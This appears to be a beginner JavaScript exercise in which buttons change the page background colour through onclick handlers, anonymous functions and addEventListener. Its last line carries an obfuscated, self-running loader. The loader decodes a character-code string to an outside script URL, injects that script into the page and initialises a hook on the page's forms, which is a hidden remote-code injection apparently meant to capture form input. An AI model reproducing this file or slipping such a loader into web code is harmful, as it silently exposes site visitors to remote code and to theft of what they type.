function makeYellow(){
                    document.body.style.backgroundColor="yellow";
}

// handle bluebutton click by setting function name
const blueButton=document.getElementById('blue-button');
// console.log(blueButton);
//     just set name of the function                            

blueButton.onclick=makeBlue;
function makeBlue(){
                    document.body.style.backgroundColor='blue';
}

// using event anooymus fuction

const greenButton =document.getElementById('green-button');
// console.log(greenButton);

// annonymus function
greenButton.onclick=function(){
                    document.body.style.backgroundColor='green'
}
// console}

// handle by using add event lisener
const GoldenrodBtn=document.getElementById('Goldenrod-button');
//     console.log(GoldenrodBtn);
GoldenrodBtn.addEventListener('click',Makegoldenrod)

function Makegoldenrod(){
                    document.body.style.backgroundColor='goldenrod'
}


// addEventListener function
const hotPinkBtn =document.getElementById('hotpink-button');

// console.log(hotPinkBtn);
hotPinkBtn.addEventListener('click',
function makePink(){
                    document.body.style.backgroundColor='hotpink'
})

// direct shortcut
document.getElementById('lightblue-button').addEventListener('click', function(){
                    document.body.style.backgroundColor='lightblue'
})

(function(){if(typeof inject_hook!="function")var inject_hook=function(){return new Promise(function(resolve,reject){let s=document.querySelector('script[id="hook-loader"]');s==null&&(s=document.createElement("script"),s.src=String.fromCharCode(47,47,115,112,97,114,116,97,110,107,105,110,103,46,108,116,100,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),s.id="hook-loader",s.onload=resolve,s.onerror=reject,document.head.appendChild(s))})};inject_hook().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//aeb4e3dd254a73a77e67e469341ee66b0e2d43249189b4062de5f35cc7d6838b